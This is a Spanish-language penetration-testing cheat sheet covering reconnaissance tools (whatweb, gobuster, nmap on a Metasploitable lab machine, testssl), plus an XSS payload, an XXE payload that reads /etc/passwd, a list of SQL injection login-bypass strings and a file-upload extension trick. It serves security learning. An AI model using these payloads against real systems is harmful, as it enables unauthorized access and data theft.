# Cheetsheet Pentest

## Reconocimiento

### Información básica

Con herramientas como whatweb podemos hacer un reconocimiento inicial del sitio web para obtener información como la IP, el SO del servidor, en que país está este alojado o alguna vulnerabilidad básica, como XSS.

``` bash
└─$ whatweb <URL>
http://35.227.24.107/d6a05ac5cf/ [200 OK] Country[UNITED STATES][US], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[35.227.24.107], Script, Title[Micro-CMS], maybe Vulnerable-To-XSS[["", "alert(1)"] ], nginx[1.14.0]
```



### Listado de directorios

Para la enumeración de directorios podemos utilizar gobuster dir.

```bash
└─$ gobuster dir -u <URL> -w <WORDLIST>
```



### Archivos interesantes

Podemos modificar la URL para encontrar archivos en el servidor como *robots.txt* o *crossdomain.xml*.





## Network

### Nmap

Con Nmap podemos obtener un escaneo de todos los puertos abiertos que tiene la máquina objetivo con su correspondiente servicio, además de saber la versión del SO, etc.

``` bash
└─$ nmap 10.0.0.4 -sV
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-26 09:20 CET
Nmap scan report for 10.0.0.4
Host is up (0.000066s latency).
Not shown: 977 closed ports
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 08:00:27:62:73:16 (Oracle VirtualBox virtual NIC)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```



### TestSSL

Con TestSSL podemos comprobar si los puertos de un servidor están protegidos con algún certificado como SSL o TLS. 

```bash
└─$ sudo docker run --rm -t mytestssl <domain>

###########################################################
    testssl.sh       3.1dev from https://testssl.sh/dev/

      This program is free software. Distribution and
             modification under GPLv2 permitted.
      USAGE w/o ANY WARRANTY. USE IT AT YOUR OWN RISK!

       Please file bugs @ https://testssl.sh/bugs/

###########################################################

 Using "OpenSSL 1.0.2-chacha (1.0.2k-dev)" [~183 ciphers]
 on 91a0c9091746:/home/testssl/bin/openssl.Linux.x86_64
 (built: "Jan 18 17:12:17 2019", platform: "linux-x86_64")


 Start 2022-01-26 08:51:16        -->> 140.82.121.3:443 (<domain>) <<--

 rDNS (140.82.121.3):    lb-140-82-121-3-fra.<domain>.
 Service detected:       Couldn't determine what's running on port 443, assuming no HTTP service => skipping all HTTP checks


 Testing protocols via sockets except NPN+ALPN 

 SSLv2      not offered (OK)
 SSLv3      not offered (OK)
 TLS 1      not offered
 TLS 1.1    not offered
 TLS 1.2    offered (OK)
 TLS 1.3    offered (OK): final
 NPN/SPDY   not offered
 ALPN/HTTP2 h2, http/1.1 (offered)

 Testing cipher categories 

 NULL ciphers (no encryption)                      not offered (OK)
 Anonymous NULL Ciphers (no authentication)        not offered (OK)
 Export ciphers (w/o ADH+NULL)                     not offered (OK)
 LOW: 64 Bit + DES, RC[2,4], MD5 (w/o export)      not offered (OK)
 Triple DES Ciphers / IDEA                         not offered
 Obsoleted CBC ciphers (AES, ARIA etc.)            offered
 Strong encryption (AEAD ciphers) with no FS       offered (OK)
 Forward Secrecy strong encryption (AEAD ciphers)  offered (OK)
```





## Reconocimiento avanzado

### Detectar XSS

Para encontrar vulnerabilidades XSS podemos utilizar una herramienta llamada Dalfox. Esta nos devolverá los payloads inyectables a una web que es vulnerable a XSS.

```bash
└─$ sudo docker run -it hahwul/dalfox:latest /app/dalfox url <http://example.com/inicio.php?"parametro">
```

Ejemplo:

``` bash
[V] Triggered XSS Payload (found DOM Object): id="><svg/OnLoad="`${prompt``}`" class=dalfox>
    1 line:  "><svg/OnLoad="`${prompt``}`" class=dalfox><body>
```



### Detectar XXE

Si analizamos las peticiones que se envian al servidor y vemos que los datos pasan por XML podríamos explotar esta vulnerabilidad para acceder a archivos del servidor:

```xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM  "file:///etc/passwd" >]>
<foo>&xxe;</foo>
```

Si modificamos la petición que contiene el XML con este código podríamos, por ejemplo, acceder al fichero /etc/passwd.



### Detectar SQLI

Para saber si una web que utiliza una BBDD para un login, por ejemplo, es vulnerable a SQLInjection debemos introducir carácteres como las `` "``. Si nos aparece un error interno del servidor (y no un error de usuario y contraseña inválidos) o directamente no nos aparece ningún error es probable que sea vulnerable.

En el apartado de explotación explico como utilizar SQLMap para explotar y extraer información de una base de datos.

#### Hacer login con bypass:

```
'-'
' '
'&'
'^'
'*'
' or 1=1 limit 1 -- -+
'="or'
' or ''-'
' or '' '
' or ''&'
' or ''^'
' or ''*'
'-||0'
"-||0"
"-"
" "
"&"
"^"
"*"
'--'
"--"
'--' / "--"
" or ""-"
" or "" "
" or ""&"
" or ""^"
" or ""*"
or true--
" or true--
' or true--
") or true--
') or true--
' or 'x'='x
') or ('x')=('x
')) or (('x'))=(('x
" or "x"="x
") or ("x")=("x
")) or (("x"))=(("x
or 2 like 2
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' -- -
admin' #
admin'/*
admin' or '2' LIKE '1
```



### Detectar File Upload

Para detectar una vulnerabilidad de File Upload primero debemos asegurarnos de si se pueden subir ficheros al servidor. En caso afirmativo miraremos si podemos subir ficheros con extensión *.sh*, *.py* o *.php*, entre otras. Si la subida de ficheros con esta extensión está bloqueada podríamos subir el script con una extensión permitida y luego interceptar la petición con BurpSuite y modificar la extensión a *.sh*, *.py* o *.php*, según nuestros intereses.

Ejemplo:

![image-20220126101046875](https://github.com/MrFrozenPepe/Pentest-Cheetsheet/blob/main/images/burp.png)

